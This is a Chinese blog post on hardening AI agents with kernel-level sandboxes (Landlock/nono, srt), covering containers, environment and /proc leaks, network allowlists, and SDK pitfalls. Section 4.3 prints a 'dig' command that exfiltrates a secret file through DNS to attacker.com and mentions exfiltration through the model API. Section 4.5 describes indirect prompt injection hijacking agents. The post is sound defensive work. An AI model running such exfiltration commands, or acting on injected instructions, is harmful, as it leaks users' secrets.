---
title: 内核级沙箱与 Agent 安全：从理论到实践
date: 2026-10-12 18:58:23
tags:
  - AI
  - Security
  - Linux
excerpt: 容器保交付、内核沙箱防暴破、密钥不进沙箱——Agent 安全的三层防御架构与 nono 集成实战
---

# 声明

本文由 🤖AI 协作完成.

> 2026-10-12 实践记录。背景：给 Agent 产品（执行未知脚本/命令的场景）集成内核级
> 沙箱，先后经历 srt（Anthropic Sandbox Runtime）与 nono（nolabs-ai）两个方案的
> 评估与迁移。文中每个安全论断都标注了来源：讨论推导的标「理论」，容器实测过的
> 标「实测」——纸上攻防的结论，最终都要靠 canary + 容器实测裁决。

# 1. 为什么 Agent 需要沙盒

Agent 与传统 FaaS 函数的本质差异：函数**无状态**、输入输出极小；Agent **长生命周期、
高频交互、富状态**。Agent 会执行未知的脚本和命令——不管跑在服务器还是本地，
安全隐私都要求沙盒集成。

一个典型场景：Agent 加载了一个 skill（文件 + 脚本 + 依赖），要让它能运行，你得把
这些资产"种"（seed）进沙盒。这是下面选型讨论的核心矛盾。

# 2. 沙盒技术选型

## 2.1 三类实现与 Seed 难题

| 路线 | 代表 | 核心问题 |
| --- | --- | --- |
| 分布式容器/沙盒 | OpenSandbox、容器集群 | **Seed 噩梦**：每次派发任务要把 workspace + 依赖资产（venv/node_modules/模板/仓库）同步进去，执行后拉 diff 回来；网络存储下高频小文件 I/O 延迟放大数十倍 |
| 本地 MicroVM | Gondolin（pi 出品，QEMU/krun） | 防线在硬件虚拟化层（最强），但绑死本地执行；水平扩展时镜像分发、快照、跨节点挂载成本劝退 |
| 内核级（原地隔离） | nono、srt | **零 Seed 成本**：Agent 与工具共享真实文件树，声明式白名单（可写 workspace、只读系统库、禁读 `~/.ssh`）；启动开销≈fork/exec；Host 现有工具链直接只读调用 |

Agent 加载 skill 时，分布式方案要为每个沙盒 seed 全部资产，成本极高；内核方案
skill 文件本来就在磁盘上，授予对应路径读权即可。这是我们选内核路线的根本原因。

## 2.2 内核级两条实现：srt vs nono

- **srt**（Anthropic）：Linux 底层 Bubblewrap + Namespaces (User/Mount/Network/PID)
  + seccomp，Host 根目录只读 bind-mount、仅 CWD 读写；macOS 走 Seatbelt；网络靠
  本地 loopback 代理做域名白名单
- **nono**（nolabs-ai，Sigstore 团队出品）：Linux 走 Landlock LSM（内核 5.13+），
  **非特权能力模型**——进程主动降权（`landlock_restrict_self`），一旦锁死自身与
  派生子进程都不可逃逸、不可改规则；macOS 同样 Seatbelt；域名过滤另有 seccomp-notify
  检查每个 `connect()` 的真实目标

实际迁移中 srt 有两个硬伤：配置 schema 无法表达"沙箱内不限制网络"
（`allowedDomains` 必填且拒绝 `*`）；TS CLI 形态需要 JSON 配置落盘 + shlex 转义链
+ node 常驻依赖。nono 的三档网络模型（全放行/全禁/域名白名单）语义更对，原生
Python SDK 直接去掉了 node 依赖。

## 2.3 内核级方案的客观边界

1. **共享内核攻击面**：MicroVM 防线在硬件虚拟化层，Guest 内核 0-day 不影响 Host；
   内核沙箱防线在系统调用接口，Agent 代码触发内核漏洞提权后可接管宿主机。内核
   沙箱防的是**误操作与恶意脚本滥用**，不是内核级 0-day——多租户不可信执行仍应
   上 MicroVM/容器集群
2. **平台碎片**：Landlock 需要内核 5.13+；Seatbelt 是 Apple 私有接口；Windows 需要
   完全独立的机制（AppContainer/Job Objects）。落地时必须 **fail-closed**：平台
   不支持就拒绝启动，禁止无沙箱降级——沙箱是安全边界，静默降级等于边界消失且
   无人察觉

# 3. 容器 + 内核沙箱：分层防御架构

Agent 产品交付通常带界面、前后端多模块，除本地开发外运行环境几乎必然是容器
（本地或云端均可部署）。正确的分层是：

```
┌─ 容器 (交付底座) ──────────────────────────────┐
│  外层网络边界: 只出不进 / 域名白名单 (基础设施)  │
│                                                │
│  ┌─ 后端服务 (持有全部密钥) ────────────────┐   │
│  │  load_dotenv → os.environ (密钥在这层)   │   │
│  └──────────────┬───────────────────────────┘   │
│                 │ sandboxed_exec(inherit_env=False)
│  ┌──────────────▼───────────────────────────┐   │
│  │ 内核沙箱 (工具脚本执行层)                  │   │
│  │  文件白名单 / env 白名单 / 网络三档        │   │
│  └──────────────────────────────────────────┘   │
└────────────────────────────────────────────────┘
```

**外层容器保交付，内层内核沙箱防暴破**——Claude Code 官方 Docker 方案与多数商业
Agent 采用同一思路。

# 4. 真正的泄露面在哪

## 4.1 文件隔离：非常坚固（理论 + 实测一致）

- srt/Bubblewrap 走 Mount Namespace：未 mount 进沙盒的路径在 VFS 中**物理不存在**，
  沙盒内即便 root 也找不到 inode
- nono/Landlock 走 LSM 截断：未显式赋权的路径，任何 `open()`/`stat()` 返回
  `-EACCES`，用户态不可绕过

实测补充：Landlock 对 `/proc` 同样生效——未给 `/proc` 授权时，`cat /proc/1/environ`
也是 `Permission denied`。

## 4.2 环境变量：最易被忽视的致命泄露点

后端进程的 `os.environ` 含 `.env` 全部密钥（`load_dotenv()` 合并）。两条隐蔽泄露
路径与对策：

**路径 A：父子进程继承**。后端拉起沙箱子进程时若不显式清理 env，容器环境变量
默认全量继承——沙箱内 `import os; print(os.environ)` 密钥裸奔。对策：
`sandboxed_exec(inherit_env=False)` + 白名单 env（只传 PATH/HOME/TMPDIR 等运行
必需项；密钥按名放行须显式配置，且约定只传配置不传密钥）。

**路径 B：`/proc` 读取**。若沙箱能看到宿主/后端进程的 procfs，`cat /proc/<pid>/environ`
可读出全量环境变量，击穿 env 白名单。**实测结论**：nono 的 Landlock 规则未给
`/proc` 授权时，`/proc/1/environ`、`/proc/self/environ`、`/proc/self/status`、
`ls /proc` 全部 `Permission denied`，canary 密钥未泄露。bwrap 路线需要 `--unshare-pid`
+ 独立 `/proc` 是不同的机制，但防线同效。

## 4.3 网络：只出不进不够，白名单有效但要堵 UDP

**"只出不进"对防泄露毫无作用**（重要且反直觉）：外带流量本质就是出站流量，
攻击者不需要进站连接——一个 HTTP POST 或 DNS 查询就能把密钥带走。

**域名白名单有效**，但要分三层看：

1. **TCP 层**：nono 白名单代理档 deny-all + 只放行本地代理端口，非代理感知程序
   （如 python urllib）同样被拦（实测）。macOS 上本质靠代理 env（弱保证），Linux
   有 seccomp 兜底（强保证）
2. **UDP DNS 隧道**（**实测打穿过，已修复**）：Landlock 只拦 TCP，若 UDP 53 可达，
   脚本可把文件内容 base64 后拼成子域名，经 DNS 递归解析外带给攻击者的权威 NS：

   ```bash
   dig $(cat secret.txt | base64 | tr -d '\n').attacker.com
   ```

   nono SDK 默认 `enforcement_mode="auto"`（纯 Landlock）**不装 UDP 过滤**（CLI
   会装，SDK 默认不装）——实测 blocked/proxy 档下 UDP 直发 8.8.8.8:53 均收到回复。
   修复：Linux 传 `enforcement_mode="seccomp"`，叠加静态过滤器（deny UDP/raw
   socket/io_uring），实测 `socket(AF_INET, SOCK_DGRAM)` 内核级 `EPERM`。

   **这是"SDK 默认 ≠ CLI 默认"的典型陷阱**：文档描述的是 CLI 行为，SDK 要显式对齐。
3. **模型反向外带**（理论）：白名单含大模型 API 时，脚本可把偷到的 key 作为 prompt
   发给模型，或诱导 Agent 输出到前端界面。对策：密钥不进沙箱（4.2）从源头消解，
   安全设计不依赖单点。

## 4.4 文件守卫的边界：TOCTOU 与符号链接（实测）

内核沙箱之外，文件工具若走 Python 层白名单判定（不经内核），存在 check-then-open
竞态的理论面。实测结论：

- `Path.resolve()` 对 symlink→白名单外、悬空链接、父目录 symlink + 新文件、深层
  链接链，均正确解析到界外并拒绝
- detached 后台进程能在 `sandboxed_exec` 返回后存活，但 Landlock 随进程不可逆，
  **存活者仍在沙箱内**（越界写仍被拒）
- 剩余面仅微秒级竞态，彻底关死需 `openat2(RESOLVE_BENEATH)` 语义——静态判定 +
  内核兜底的组合已足够实用

## 4.5 System Prompt 不是安全边界

**Prompt 是软约束（引导），内核与沙箱才是硬边界（防御）**。当 Agent 从未知网页、
仓库 README、外部文件读到精心构造的指令（间接 prompt injection），LLM 很容易被
催眠违背 system 指令、主动调用工具读敏感信息。安全设计必须假设 prompt 会被绕过。

# 5. nono SDK 集成踩坑实录

理论之外，实际集成 nono SDK 的关键经验：

1. **SDK 的 CapabilitySet 是裸的**：没有 CLI 的默认系统路径组。deny-by-default 下
   解释器能活的读白名单必须自己给——macOS 要 `/usr` `/bin` `/System` `/Library`
   `/dev` `/etc` `/private/var/folders` 等（dyld shared cache、xcode-select shim、
   cert.pem，一处缺则解释器/工具启动即死）；Linux 要 `/lib` `/lib64`
2. **macOS DNS 走 mDNSResponder unix socket**：SDK 不自动加规则，缺了就是
   `Could not resolve host`（curl exit 6）
3. **enforcement_mode 对齐**：4.3 的 UDP 修复
4. **/dev/null 单文件授权**：`/dev` 只有目录级 READ 时，`>/dev/null 2>&1` 重定向
   直接报错——mac/linux 双平台实测均如此；用 `allow_file("/dev/null", READ_WRITE)`
   修复（与目录级授权互补的单文件 API）
5. **fail-closed**：平台不支持（内核 <5.13 / Landlock 未启用）启动即退出，禁止
   降级；SDK 缺失 import 即失败
6. **密钥最小化**：env 按名放行（`SANDBOX_ENV_PASSTHROUGH`），约定只传配置不传
   密钥；需要敏感信息才能运行的服务重构为 tool/MCP（key 留在后端进程）
7. **攻击面要实测不要推理**：外部 review 提出的 /proc 逃逸经实测不成立，UDP 隧道
   经实测成立并修复——纸上攻防的结论必须用 canary + 容器实测裁决

# 6. 责任归属：allow-all 是人的决策，不是工具缺陷

工具无法判断任一网站是否安全合法——白名单配置是运营者的责任。域名白名单不配置
（全放行档）的后果归属决策人，不归属工具；技术侧的义务是把三档语义、风险与配置
方法写清楚。生产部署应配置具体域名列表。

# 7. 总结：三层架构清单

| 层 | 职责 | 关键配置 |
| --- | --- | --- |
| 容器（交付底座） | 部署一致性、外层网络边界（只出不进） | 容器网络策略 / iptables（UDP 53 可选再收紧） |
| 内核沙箱（工具脚本层） | 文件读写白名单、env 白名单、网络三档、UDP/raw socket 拦截 | Landlock/Seatbelt + `enforcement_mode="seccomp"`（Linux）+ fail-closed 启动检查 |
| 后端服务（密钥保管层） | 持有全部密钥、代理敏感调用（tool/MCP）、`inherit_env=False` | env 白名单只放配置；需要密钥的能力重构为 tool/MCP |

选型建议收敛为双轨（与业界实践一致）：

- **开发者本地 / 单租户 Agent**（Claude Code、本地 Coding Agent）：内核能力隔离
  （nono/srt）——极致 I/O、零 Seed 启动、原生共享环境，防线重点是防误删、防越权、
  防读敏感凭据
- **云端托管 / 多租户不可信执行**：MicroVM/容器集群（Kata 等）——硬隔离不可妥协，
  Seed 难题业界正以 OverlayFS + 远程只读快照延迟加载优化
